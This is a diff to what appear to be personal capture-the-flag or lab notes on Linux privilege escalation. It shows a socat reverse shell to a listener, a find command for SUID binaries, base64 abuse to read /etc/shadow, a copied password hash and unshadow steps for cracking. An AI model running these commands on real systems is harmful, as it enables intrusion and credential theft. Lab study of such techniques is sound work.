@@ -16,5 +16,39 @@ soln & acess
 sudo socat tcp-connect:10.8.115.203:1234 exec:bash,pty,stderr,setsid,sigint,sane
 socat file:`tty`,raw,echo=0 tcp-listen:1234
 
+SUID
+-----
+
+Details : https://gtfobins.github.io/#+suid
+1. we will take a look at SUID permissions of files with find commad
+    - find / -type f -perm -04000 -ls 2>/dev/null
+# get password
+2. we first encrypt it with base64, then decode it by typing base64 -d and read it
+   - /usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
+   or
+  $ LL=/etc/shadow
+  $ base64 "$LL" | base64 --decode
+then copy - user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
+which file is -> user_shad.txt
+
+3. to create unshadow we copy passwd and shadow contents separate files and use unshadow commad
+  - unshadow passwd shadow | tee cracked
+  or
+  cat /etc/passwd
+  then take copy - user2:x:1002:1002::/home/user2:/bin/sh
+  which name is -> user_pass.txt
+
+4. unshadow user_shad.txt user_pass.txt > userpasswd
+  if change the possition like-
+  unshadow user_pass.txt user_shad.txt > userpassd
+  then result different output
+
+
+
+
+
+
+
+
 
 
